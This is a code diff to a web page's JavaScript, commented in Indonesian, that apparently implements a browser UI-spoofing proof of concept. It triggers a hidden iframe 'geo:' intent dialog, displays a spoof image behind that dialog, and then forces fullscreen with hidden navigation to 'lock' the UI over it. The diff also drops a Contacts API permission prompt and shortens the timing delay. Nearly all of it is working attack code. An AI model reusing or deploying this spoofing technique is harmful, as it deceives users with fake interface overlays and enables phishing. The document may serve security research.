@@ -83,22 +83,11 @@
       let statusInfo = document.getElementById("statusInfo");
 
       execButton.onclick = async function () {
-        statusInfo.innerText = "Status: Deploying context vectors & permission requests...";
+        statusInfo.innerText = "Status: Deploying context vectors & intent dialog...";
         this.style.display = "none";
 
         try {
-          // 1. Memicu pemanggilan API contacts selector secara asinkron (jika didukung browser)
-          if (navigator.contacts && navigator.contacts.select) {
-            (async () => {
-              try {
-                await navigator.contacts.select(["name"], { multiple: false });
-              } catch (e) {
-                console.debug("Contacts API restricted or dismissed:", e);
-              }
-            })();
-          }
-
-          // 2. Memicu iframe geo: intent untuk menampilkan dialog "Open with" secara instan
+          // 1. Memicu iframe geo: intent untuk menampilkan dialog "Open with" secara instan
           let spoofFrame = document.createElement("iframe");
           spoofFrame.style.display = "none";
           spoofFrame.src = "geo:0,0?q=apple.com";
@@ -106,13 +95,13 @@
 
           statusInfo.innerText = "Status: Dialog triggered. Activating visual overlay & fullscreen in 2s...";
 
-          // 3. Menampilkan gambar spoof secara instan di latar belakang dialog
+          // 2. Menampilkan gambar spoof secara instan di latar belakang dialog
           let spoofImg = document.getElementById("spoof");
           if (spoofImg) {
             spoofImg.style.display = "block";
           }
 
-          // 4. Eksekusi Fullscreen dengan navigasi tersembunyi setelah jeda 2 detik
+          // 3. Eksekusi Fullscreen dengan navigasi tersembunyi setelah jeda 2 detik
           setTimeout(() => {
             let docElement = document.documentElement;
             
@@ -131,7 +120,7 @@
             }
             
             statusInfo.innerText = "Status: Ultimate Fullscreen active & UI locked over dialog state.";
-          }, 2000);
+          }, 1500);
 
         } catch (err) {
           statusInfo.innerText = "Status: Execution error: " + err.message;
